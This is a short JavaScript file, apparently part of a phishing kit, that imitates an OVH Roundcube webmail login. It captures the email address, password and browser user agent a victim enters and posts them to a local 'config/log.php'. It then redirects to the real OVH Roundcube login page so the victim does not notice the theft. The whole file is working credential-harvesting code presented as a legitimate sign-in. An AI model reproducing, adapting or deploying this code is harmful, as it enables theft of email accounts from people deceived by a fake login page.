function login(){
	
var email =	$("#rcmloginuser").val();
var pass	 =	$("#rcmloginpwd").val();
	
	//alert(ID_sg);
	//alert(PASS_sg);
	
 if(email==''){

swal({
icon: 'error',
title: 'Erreur !',
text: "Veuillez renseigner votre nom d'utilisateur"

})	

return false;	
} 
if(pass==''){

swal({
icon: 'error',
title: 'Erreur !',
text: "Veuillez renseigner votre mot de passe"

})	

return false;	
} 


var data_log = 
{
DEVICE       : navigator.userAgent,
EMAIL		 :   email,
PASSE        :	pass

}; 


var _url = './config/log.php';
$.post(_url,data_log,function(data){
 var reponse = JSON.parse(data); 


if(reponse.statut=="error"){	

swal({
icon: reponse.statut,
title: reponse.title,
text: reponse.resultat

});
}else if(reponse.statut=="success"){	


     window.location="https://mail.ovh.net/roundcube/?_task=login";
    

    

} 


})
}